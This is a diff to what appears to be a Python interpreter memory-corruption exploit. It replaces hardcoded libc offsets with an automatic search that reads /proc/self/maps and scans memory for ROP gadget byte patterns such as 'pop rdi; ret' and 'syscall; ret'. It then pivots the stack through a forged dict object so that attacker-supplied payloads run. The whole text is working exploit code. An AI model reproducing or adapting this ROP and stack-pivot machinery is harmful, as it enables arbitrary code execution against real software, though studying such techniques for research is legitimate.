@@ -180,11 +180,45 @@ def setrip(addr, rsi=tuple(), rdx=dict()):
 	return my_func(*rsi, **rdx)
 
 
-# XXX: work-in-progress
-def do_rop(payload):
-	libc_base = int([l for l in open("/proc/self/maps").read().split("\n") if "libc-" in l][0].split("-")[0], 16) # XXX: cheating!
-	mov_rsp_rdx_ret = libc_base + 0x52ab0 # XXX: hardcoded!
-	pop1ret = libc_base + 0x40780 # XXX hardcoded!
+gadgets = {}
+def find_gadgets():
+	global gadgets
+	if gadgets:
+		return gadgets
+	
+	gadget_patterns = {
+		"ret": b"\xc3",
+		"mov rsp, rdx; ret": b"\x48\x89\xd4\xc3",
+		"pop rax; ret": b"\x58\xc3",
+		"pop rbx; ret": b"\x5b\xc3",
+		"pop rcx; ret": b"\x59\xc3",
+		#"pop rdx; ret": b"\x5a\xc3",
+		"pop rdx; pop rbx; ret": b"\x5a\x5b\xc3",
+		"pop rsi; ret": b"\x5e\xc3",
+		"pop rdi; ret": b"\x5f\xc3",
+		#"pop r8; ret": b"\x41\x58\xc3",
+		#"pop r9; ret": "\x41\x59\xc3",
+		"syscall; ret": b"\x0f\x05\xc3",
+	}
+	
+	libc_base = int([l for l in open("/proc/self/maps").read().split("\n") if "libc-" in l and "r-x" in l][0].split("-")[0], 16) # XXX: cheating!
+	mem = getmem()
+	
+	print("[*] Performing gadget search")
+	for name, pattern in gadget_patterns.items():
+		addr = mem.index(pattern, libc_base)
+		print("[+] 0x%016x -> %s" % (addr, repr(name)))
+		gadgets[name] = addr
+	
+	return gadgets
 
-	fakedict = fakeobj(refbytes(bytes(p64a(pop1ret-4, addrof(dict)) + payload)))
-	setrip(mov_rsp_rdx_ret, rdx=fakedict)
+
+def do_rop(payload):
+	gadgets = find_gadgets()
+
+	fakedict = fakeobj(refbytes(bytes(p64a(
+		gadgets["pop rax; ret"] - 4,  # subtract for to offset refcounting
+		addrof(dict)
+	) + payload)))
+
+	setrip(gadgets["mov rsp, rdx; ret"], rdx=fakedict)
